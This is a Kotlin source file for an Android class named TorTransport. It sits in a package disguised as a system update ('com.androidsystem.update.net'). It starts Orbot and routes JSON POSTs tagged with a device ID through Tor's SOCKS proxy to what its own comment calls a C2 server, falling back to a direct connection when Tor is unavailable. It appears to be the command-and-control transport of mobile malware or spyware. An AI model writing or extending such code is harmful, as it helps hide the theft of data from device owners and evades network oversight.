package com.androidsystem.update.net

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.util.Log
import java.net.HttpURLConnection
import java.net.InetSocketAddress
import java.net.Proxy
import java.net.URL
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Optional transport over Tor via Orbot. Orbot exposes a SOCKS proxy on
 * 127.0.0.1:9050 once the user has started the VPN. We probe the port and
 * route HTTP through it. If Orbot is not installed or not running we fall
 * back to the default transport — never hard-fail because the C2 is
 * unreachable.
 *
 * No raw-socket fiddling, no native code. The Java HttpURLConnection accepts
 * a [Proxy] of type SOCKS so this is the simplest correct path.
 */
@Singleton
class TorTransport @Inject constructor(private val context: Context) {
    private val tag = "TorTransport"
    @Volatile private var usingTor: Boolean = false

    fun ensureOrbotStarted() {
        try {
            val intent = Intent("org.torproject.android.intent.action.START").apply {
                setPackage("org.torproject.android")
            }
            context.startActivity(intent)
        } catch (e: Throwable) {
            Log.w(tag, "Orbot not installed or refused start")
        }
    }

    /** Quick SOCKS-port probe; non-blocking. */
    fun isTorReachable(): Boolean = try {
        val s = java.net.Socket()
        s.connect(InetSocketAddress.createUnresolved("127.0.0.1", 9050), 800)
        s.close()
        true
    } catch (e: Throwable) { false }

    fun setUsingTor(on: Boolean) { usingTor = on }

    fun postJson(endpoint: String, body: String, deviceId: String): Pair<Int, String> {
        val conn = (URL(endpoint).openConnection(if (usingTor) Proxy(Proxy.Type.SOCKS, InetSocketAddress("127.0.0.1", 9050)) else Proxy.NO_PROXY) as HttpURLConnection)
        return try {
            conn.requestMethod = "POST"
            conn.connectTimeout = 30_000
            conn.readTimeout = 60_000
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("X-Device-Id", deviceId)
            conn.doOutput = true
            conn.outputStream.use { it.write(body.toByteArray()) }
            val code = conn.responseCode
            val stream = if (code in 200..299) conn.inputStream else conn.errorStream
            val text = stream?.bufferedReader()?.use { it.readText() } ?: ""
            code to text
        } catch (e: Throwable) {
            Log.w(tag, "post over tor failed: ${e.message}")
            -1 to e.message.orEmpty()
        } finally {
            conn.disconnect()
        }
    }
}
